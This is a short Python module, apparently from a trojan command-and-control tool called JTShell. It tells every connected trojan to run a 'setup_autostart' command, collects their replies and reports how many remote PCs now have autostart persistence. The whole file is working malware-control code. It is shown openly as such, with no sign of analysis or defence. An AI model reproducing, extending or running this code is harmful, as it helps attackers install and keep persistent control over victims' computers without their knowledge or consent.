__author__ = 'Jonas'
from scriptshell import ScriptShell
from util import shellprint
from util import trojanrecv
from util import TrojanMessage
from JTShell.util.error import ProcessError
from JTShell.util.message import Message
import time


def run(process):
    shell = process.shell
    if isinstance(shell, ScriptShell):
        # itering trough the connected trojans executing the script on each of them then waiting for their individual
        # comments and returns
        successfull_implementations = 0
        shell.client.execute("s:setup_autostart")
        while shell.client.end_seq not in shell.client.receive_buffer:
            while len(shell.client.receive_buffer) == 0:
                time.sleep(0.01)
            reply = shell.client.receive()
            print(TrojanMessage(reply).message)
            successfull_implementations += 1
        if successfull_implementations == 0:
            raise ProcessError("failed to implement any autostart protocols")
        elif successfull_implementations >= 1:
            return "implemented autostart behaviour on {0} remote pcs".format(successfull_implementations)
